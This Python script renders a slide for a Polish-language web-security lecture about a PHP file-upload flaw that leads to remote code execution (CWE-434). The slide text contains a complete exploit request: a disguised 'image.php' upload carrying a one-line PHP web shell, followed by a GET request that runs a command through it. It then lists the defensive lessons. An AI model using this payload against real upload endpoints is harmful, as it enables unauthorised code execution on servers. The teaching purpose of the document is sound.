#!/usr/bin/env python3
"""Regenerate hist-01 technical slide (1280×720) from deck reference + vector overlay."""
from __future__ import annotations

from pathlib import Path

from PIL import Image, ImageDraw, ImageFont

ROOT = Path(__file__).resolve().parents[1]
REF = Path(
    "/home/ubuntu/.cursor/projects/agent-repos-websecurity/assets/"
    "12d0199c-4687-4009-bc57-ceb13dffe61b.png"
)
OUT_720 = ROOT / "illustrations/hist-01-php-shell-technical-720p.png"
OUT_1080 = ROOT / "illustrations/hist-01-php-shell-technical.png"

# Supersample 2× then downscale for sharp type at 720p
W, H = 1280, 720
SS = 2
SW, SH = W * SS, H * SS


def load_font(path: str, size: int) -> ImageFont.FreeTypeFont:
    return ImageFont.truetype(path, size * SS)


def scale_xy(x: float, y: float) -> tuple[float, float]:
    return x * SS, y * SS


def main() -> None:
    ref = Image.open(REF).convert("RGB")
    base = ref.resize((SW, SH), Image.LANCZOS)
    draw = ImageDraw.Draw(base)

    inter_b = "/usr/share/fonts/truetype/macos/Inter-Bold.ttf"
    inter_sb = "/usr/share/fonts/truetype/macos/Inter-SemiBold.ttf"
    inter_m = "/usr/share/fonts/truetype/macos/Inter-Medium.ttf"
    inter_r = "/usr/share/fonts/truetype/macos/Inter-Regular.ttf"
    mono = "/usr/share/fonts/truetype/jetbrains-mono/JetBrainsMono-Medium.ttf"
    mono_b = "/usr/share/fonts/truetype/jetbrains-mono/JetBrainsMono-SemiBold.ttf"

    f_title = load_font(inter_b, 38)
    f_sub = load_font(inter_m, 14)
    f_box_t = load_font(inter_sb, 15)
    f_box_s = load_font(inter_r, 12)
    f_code = load_font(mono, 12.5)
    f_code_hi = load_font(mono_b, 12.5)
    f_lesson = load_font(inter_sb, 15)

    # Clean canvas (keep ludzik + corners)
    draw.rectangle([0, 0, SW, 92 * SS], fill="#ffffff")
    draw.rectangle([1145 * SS, 95 * SS, SW, 520 * SS], fill="#ffffff")
    draw.rounded_rectangle(
        [115 * SS, 88 * SS, 1165 * SS, 625 * SS], radius=22 * SS, fill="#ffffff"
    )
    left = ref.resize((SW, SH), Image.LANCZOS).crop((0, 0, 230 * SS, SH))
    base.paste(left, (0, 0))
    ref_scaled = ref.resize((SW, SH), Image.LANCZOS)
    for box in [
        (0, 0, 200 * SS, 120 * SS),
        (SW - 200 * SS, 0, SW, 120 * SS),
        (0, SH - 120 * SS, 200 * SS, SH),
        (SW - 200 * SS, SH - 120 * SS, SW, SH),
    ]:
        base.paste(ref_scaled.crop(box), (box[0], box[1]))

    draw = ImageDraw.Draw(base)

    navy = "#1a365d"
    muted = "#5a6b7d"
    card = "#141c2b"
    card_edge = "#2a3a52"

    # Title matches deck attachment
    draw.text((SW // 2, 18 * SS), "Skrajnie technicznie", fill=navy, font=f_title, anchor="mt")
    draw.text(
        (SW // 2, 62 * SS),
        "Przypadek 1 · upload image.php jako image/jpeg → RCE (CWE-434)",
        fill=muted,
        font=f_sub,
        anchor="mt",
    )

    # Code card
    x0, y0, x1, y1 = 232 * SS, 100 * SS, 790 * SS, 422 * SS
    draw.rounded_rectangle([x0, y0, x1, y1], radius=18 * SS, fill=card)
    draw.rounded_rectangle(
        [x0, y0, x1, y1], radius=18 * SS, outline=card_edge, width=2 * SS
    )

    lines: list[tuple[str, str, bool]] = [
        ("POST /avatar/upload HTTP/1.1", "#8fd3b4", False),
        ("Content-Type: multipart/form-data; boundary=----WebKit", "#8fd3b4", False),
        ("", "#ffffff", False),
        ("------WebKitFormBoundary", "#8b9cb3", False),
        ('Content-Disposition: form-data; name="avatar";', "#e8eef5", False),
        ('  filename="image.php"', "#e8eef5", False),
        ("Content-Type: image/jpeg", "#c5d4e8", False),
        ("", "#ffffff", False),
        ("GIF89a;", "#7dd3a0", False),
        ("<?php system($_GET['cmd']); ?>", "#f6ad55", True),
        ("------WebKitFormBoundary--", "#8b9cb3", False),
        ("", "#ffffff", False),
        ("Saved on disk: /uploads/image.php", "#7dd3a0", False),
        ("GET /uploads/image.php?cmd=whoami HTTP/1.1", "#8fd3b4", False),
    ]
    y = y0 + 16 * SS
    for text, color, bold in lines:
        if text:
            font = f_code_hi if bold else f_code
            draw.text((x0 + 18 * SS, y), text, fill=color, font=font)
        y += 23.5 * SS

    boxes = [
        (
            802 * SS,
            106 * SS,
            1155 * SS,
            196 * SS,
            "#fde8ef",
            "#e8b4c4",
            "1. Upload checks pass",
            "Part says image/jpeg; file still .php",
        ),
        (
            802 * SS,
            206 * SS,
            1155 * SS,
            296 * SS,
            "#e3f5e8",
            "#a8d5b5",
            "2. GET → mod_php by extension",
            "Not JPEG sniffing — Apache runs *.php",
        ),
        (
            802 * SS,
            306 * SS,
            1155 * SS,
            396 * SS,
            "#e6f2fa",
            "#a8c9e8",
            "Why GIF89a does not block RCE",
            "PHP scans whole file for <?php … ?>",
        ),
    ]
    for x0b, y0b, x1b, y1b, fill, edge, title, sub in boxes:
        draw.rounded_rectangle([x0b, y0b, x1b, y1b], radius=14 * SS, fill=fill, outline=edge, width=1 * SS)
        draw.text((x0b + 18 * SS, y0b + 14 * SS), title, fill=navy, font=f_box_t)
        draw.text((x0b + 18 * SS, y0b + 42 * SS), sub, fill=muted, font=f_box_s)

    draw.rectangle([160 * SS, 598 * SS, SW - 160 * SS, SH], fill="#ffffff")
    draw.rounded_rectangle(
        [172 * SS, 640 * SS, SW - 172 * SS, 700 * SS], radius=16 * SS, fill="#f5c518"
    )
    # shield
    sx, sy = 210 * SS, 654 * SS
    draw.polygon(
        [
            (sx + 14 * SS, sy),
            (sx + 28 * SS, sy + 7 * SS),
            (sx + 28 * SS, sy + 26 * SS),
            (sx + 14 * SS, sy + 38 * SS),
            (sx, sy + 26 * SS),
            (sx, sy + 7 * SS),
        ],
        fill=navy,
    )
    draw.text(
        (SW // 2 + 12 * SS, 670 * SS),
        "Lekcja: lista dozwolona · weryfikacja treści · brak PHP w uploads/",
        fill=navy,
        font=f_lesson,
        anchor="mm",
    )

    final = base.resize((W, H), Image.LANCZOS)
    OUT_720.parent.mkdir(parents=True, exist_ok=True)
    final.save(OUT_720, optimize=True)
    final.resize((1920, 1080), Image.LANCZOS).save(OUT_1080, optimize=True)
    print(OUT_720, OUT_1080)


if __name__ == "__main__":
    main()